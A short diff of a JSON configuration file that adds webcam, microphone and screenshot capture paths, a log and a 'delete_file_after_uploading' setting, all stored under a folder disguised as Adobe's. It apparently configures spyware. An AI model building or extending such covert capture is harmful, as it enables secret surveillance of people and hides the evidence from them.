@@ -17,9 +17,18 @@
     }
   },
 
+  "settings": {
+    "delete_file_after_uploading": true
+  },
+
   "paths": {
     "main": "\\Adobe\\PMT\\Storage\\",
+    "webcam": "webcam.png",
+    "microphone": "microphone.wav",
+    "screenshot": "screenshot.png",
     "tags": "tags.dat",
+    "name": "name.dat",
+    "log": "log.json",
     "anchor": "version.dat"
   },
 
